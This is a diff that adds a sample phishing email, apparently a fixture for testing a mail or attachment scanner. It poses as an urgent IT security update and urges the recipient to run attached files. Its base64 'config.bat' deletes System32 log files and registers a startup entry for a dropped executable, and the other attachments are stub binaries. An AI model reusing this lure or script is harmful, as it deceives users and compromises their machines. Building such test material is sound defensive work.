@@ -1,0 +1,90 @@
+Return-Path: <admin@suspicious-corp.ml>
+Delivered-To: employee@company.com
+Received: from mail.suspicious-corp.ml ([195.133.40.23])
+	by mail.company.com with ESMTP id file123
+	for <employee@company.com>; Thu, 17 Nov 2023 09:15:20 +0000
+X-Originating-IP: 195.133.40.23
+Authentication-Results: mail.company.com;
+	spf=neutral smtp.mailfrom=admin@suspicious-corp.ml;
+	dkim=none;
+Message-ID: <attachment-test-001@suspicious-corp.ml>
+Date: Thu, 17 Nov 2023 09:15:10 +0000
+From: "IT Department" <admin@suspicious-corp.ml>
+To: employee@company.com
+Subject: Mandatory Software Update - Install Required Files
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_003_file_test"
+
+------=_Part_003_file_test
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+Dear Employee,
+
+Our IT department requires you to install the following security updates immediately.
+
+Please download and run the attached files in the specified order:
+
+1. security-update.exe (Windows Security Patch)
+2. config.bat (Configuration Script)
+3. installer.msi (Main Installer Package)
+4. readme.pdf (Installation Instructions)
+
+Failure to install these updates within 24 hours may result in system vulnerabilities.
+
+Contact IT support if you have questions: support@suspicious-corp.ml
+
+Best regards,
+IT Security Team
+
+------=_Part_003_file_test
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="security-update.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9T
+IG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAOh8JVAAAAAAAAAAAAAAAE4AAgABCwEICgAAABAAAAAQ
+AAAAEAAAsOAAAAAAEAAAAABAAAAAEAAAABAAAAAQAAAAAAAAEAAAAAAAABAAABAAAAAAAAAB
+AAAQEABAAAAAAA
+
+------=_Part_003_file_test
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="config.bat"
+Content-Transfer-Encoding: base64
+
+QGVjaG8gb2ZmCmNkIC9kICJDOlxXaW5kb3dzXFN5c3RlbTMyIgpkZWwgL3EgL3MgKi5sb2cKcmVn
+IGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4i
+IC92IFNlY3VyaXR5VXBkYXRlIC9kICJDOlxUZW1wXHVwZGF0ZS5leGUiIC9mCmVjaG8gQ29uZmln
+dXJhdGlvbiBjb21wbGV0ZWQ=
+
+------=_Part_003_file_test
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="installer.msi"
+Content-Transfer-Encoding: base64
+
+0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAABAAAAAQAAAAAA
+AAAQAAAAAgAAAAEAAAD+////AAAAAAEAAAD///////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////
+
+------=_Part_003_file_test
+Content-Type: application/pdf
+Content-Disposition: attachment; filename="readme.pdf"
+Content-Transfer-Encoding: base64
+
+JVBERi0xLjUKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAwIFIKPj4KZW5kb2Jq
+CjIgMCBvYmoKPDwKL1R5cGUgL1BhZ2VzCi9LaWRzIFsgMyAwIFIgXQovQ291bnQgMQo+PgplbmRv
+YmoKMyAwIG9iago8PAovVHlwZSAvUGFnZQovUGFyZW50IDIgMCBSCi9NZWRpYUJveCBbIDAgMCA2
+MTIgNzkyIF0KL1Jlc291cmNlcyA8PAovRm9udCA8PAovRjEgNCAwIFIKPj4KPj4KL0NvbnRlbnRz
+IDUgMCBSCj4+CmVuZG9iago0IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9TdWJ0eXBlIC9UeXBlMQov
+QmFzZUZvbnQgL0hlbHZldGljYQo+PgplbmRvYmoKNSAwIG9iago8PAovTGVuZ3RoIDEwNQo+Pgpz
+dHJlYW0KQlQKcQo3MiA3MjAgVGQKQlQKL0YxIDEyIFRmCihJbnN0YWxsYXRpb24gSW5zdHJ1Y3Rp
+b25zKSBUagowIC0yMCBUZAooMS4gUnVuIHNlY3VyaXR5LXVwZGF0ZS5leGUpIFRqCjAgLTIwIFRk
+CigyLiBSdW4gY29uZmlnLmJhdCkgVGoKMCAtMjAgVGQKKDMuIEluc3RhbGwgaW5zdGFsbGVyLm1z
+aSkgVGoKRVQKUQplbmRzdHJlYW0KZW5kb2JqCnhyZWYKMCA2CjAwMDAwMDAwMDAgNjU1MzUgZiAK
+MDAwMDAwMDAwOSAwMDAwMCBuIAowMDAwMDAwMDU4IDAwMDAwIG4gCjAwMDAwMDAxMTUgMDAwMDAg
+biAKMDAwMDAwMDI0NSAwMDAwMCBuIAowMDAwMDAwMzEyIDAwMDAwIG4gCnRyYWlsZXIKPDwKL1Np
+emUgNgovUm9vdCAxIDAgUgo+PgpzdGFydHhyZWYKNDY4CiUlRU9G
+
+------=_Part_003_file_test-- 
